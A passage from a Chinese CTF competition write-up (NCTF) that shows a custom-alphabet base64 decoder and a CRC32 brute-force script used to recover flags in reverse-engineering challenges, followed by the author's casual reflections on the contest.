        lackCharNums = 3 - len(preCoding) % 3
        if lackCharNums == 3 : lackCharNums = 0 #整除说明不缺字符
        #待转换字符不是3的倍数的情况补全它
        for i in range(lackCharNums) :
            preCoding = preCoding + b'\x00'
        result = '' #用于保存最终结果的str数据
        rp = '' #处理补全字符时的暂存变量
        #每三个字符处理一轮
        for i in range(int(len(preCoding) / 3)):
            threeChar = preCoding[i * 3 : i * 3 + 3] #取三个字符出来
            tCode = '' #用于存放三个字符拼接后的二进制数值 文本形式
            pCode = '' #暂存变量
            for j in range(3) :
                pCode = bin(threeChar[j])[2 :]  #把省略的0补上
                lackZeroNums = 8 - len(pCode) #省略的0的个数
                for x in range(lackZeroNums):
                    pCode = '0' + pCode
                tCode = tCode + pCode
            pCode = ''
            for j in range(4): #每6位一个字符
                pCode = tCode[j * 6 : j * 6 + 6]
                rp = rp + charTable[int(pCode, 2)]
            #处理补全的00字符
            result = rp[: len(rp) - lackCharNums]
            for j in range(lackCharNums):
                result = result + '='
        return bytes(result, encoding = "utf-8")
    
    def myBase64Decode(encodedBin) :
        charTable = "#$%&\x27()*+,-.s0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[h]^_`ab\x00" #字符表
    
        #如果字符不是4的倍数 返回空
        if not len(encodedBin) % 4 == 0 :
            return ''
    
        tCode = '' #用于存放最终的二进制文本字符串
        pCpde = '' #暂存变量
        #遍历encodedBin每一个字符
        for i in encodedBin:
            for j in range(len(charTable)): #找到表中对应坐标
                if chr(i) == charTable[j]:
                    pCode = bin(j)[2 :]  #转二进制去除开头的0b
                    lackZeroNums = 6 - len(pCode) #省略的0的个数
                    for x in range(lackZeroNums):
                        pCode = '0' + pCode
                    tCode = tCode + pCode
        pCode = ''
        result = '' #储存最终结果
        print(tCode)
        for i in range(int(len(tCode) / 8)):
            pCode = tCode[i * 8 : i * 8 + 8]
            result = result + chr(int(pCode, 2))
        return bytes(result, encoding = "utf-8")
    
    # print(myBase64Encode(b"helloworld"))
    # print(myBase64Decode(b"U>F2UsQXN`5sXMELT=:7M_2<X]^1ThaWF0=KM?9IUhAsTM5:T==_Ns&<Vhb!"))
    tmp = b'6G074JP+s)WV:Z+T<&(Q18`Ks)WV:Y4hs9[h:YCS?&0`'
    print(myBase64Decode(tmp))
    

###  鲨鲨的秘密

> 题目描述:
>  
>  
>     听说这是狗狗的秘密
>  
>
> 附件链接:
>  
>  
>     链接：http://39.102.33.27:5212/#/s/D3Un
>     https://upyun.clq0.top/attachment_1.exe
>  

用了一个一次执行一句话的汇编实现的CRC32，爆破即可获得答案:

    
    
    import zlib
    
    result = [  -1057595298,
      11628042,
      857318098,
      1472903095,
      -1704694372,
      -1109907674,
      -667354223,
      -1914631245,
      392891821,
      1751113455,
      740292529,
      1816412822,
      -1587741040,
      550340385,
      1654029544,
      739656189,
      1462570906,
      -1370301396,
      1346993615,
      -9781430]
    
    
    def find_str(index):
        for i in range(128):
            for j in range(128):
                tmp = bytes([i,j])
                res = zlib.crc32(tmp) % (1<<32)
                if res == (result[index] % (1<<32)):
                    return chr(i)+chr(j)
                # else:
                #     return "ERROR"
    index = 0
    ans = ''
    while index < len(result):
        ans += find_str(index)
        index += 1
        print(index)
    
    print(ans)
    

## 小结

啊啊啊啊啊，这比赛 web 题目太难了吧！！！！

Misc 那个 python 过滤 `(` 下的命令执行还是挺有意思的，学到了许多。

Web 咋一堆 Java 啊，欺负咱玩不来 Java，嘤嘤嘤。还有俩 XSS，一个 NodeJS 一个
Golang，本来还想做做的，试了试不会，看了提示根本没想到是啥东西，摸了，太顶了！

Reverse 有个 mobile 的题目，看 wp 应该比 web 简单，要不是他排在最后一题的位置，早知道就去看他了（害，不就是喵喵太菜了想多做几题
web，Crypto 咱也不会，唉

大家看看 web 最后的解题情况，来自群友的截图——

![](https://p3.ssl.qhimg.com/t01f256f721d054d366.png)

怎么说呢，本来还说想来恰烂钱的，结果啥也没恰到，好亏啊啊啊啊！摆烂了摆烂了。

当然，还要感谢队友和喵喵一起来玩。

还是要好好学习学习喵。

欢迎各位大师傅们来 [咱博客](https://miaotony.xyz/?utm_source=anquanke) 逛逛喵~

_（溜了溜了喵~_

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **miaotony** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/263036](/post/id/263036)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [nctf](/tag/nctf)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg) miaotony

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

